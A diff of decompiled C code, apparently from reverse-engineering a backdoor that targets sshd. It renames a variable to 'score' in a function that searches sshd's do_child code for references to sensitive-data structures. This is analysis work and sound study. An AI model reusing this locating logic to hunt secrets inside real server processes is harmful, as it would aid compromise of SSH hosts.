@@ -22,19 +22,19 @@ int sshd_get_sensitive_data_score_in_do_child
   BOOL hit_found;
   long clear_idx;
   u8 **ctx_cursor;
-  uint uVar4;
+  uint score;
   u8 zero_seed;
   dasm_ctx_t insn_ctx;
   u8 *do_child_start;
   u8 *do_child_end;
   
   zero_seed = 0;
-  uVar4 = 0;
+  score = 0;
   code_start = (u8 *)refs->entries[1].func_start;
   if (code_start != (u8 *)0x0) {
     code_end = (u8 *)refs->entries[1].func_end;
     hit_found = find_instruction_with_mem_operand(code_start,code_end,(dasm_ctx_t *)0x0,sensitive_data);
-    uVar4 = (uint)(hit_found != FALSE);
+    score = (uint)(hit_found != FALSE);
     ctx_cursor = &do_child_start;
     for (clear_idx = 0x16; clear_idx != 0; clear_idx = clear_idx + -1) {
       *(undefined4 *)ctx_cursor = 0;
@@ -48,13 +48,13 @@ int sshd_get_sensitive_data_score_in_do_child
                         (do_child_end + (long)do_child_start,code_end,(dasm_ctx_t *)0x0,
                          (void *)((long)sensitive_data + 0x10));
       if (hit_found == FALSE) {
-        uVar4 = uVar4 + 1;
+        score = score + 1;
       }
       else {
-        uVar4 = uVar4 + 2;
+        score = score + 2;
       }
     }
   }
-  return uVar4;
+  return score;
 }
 
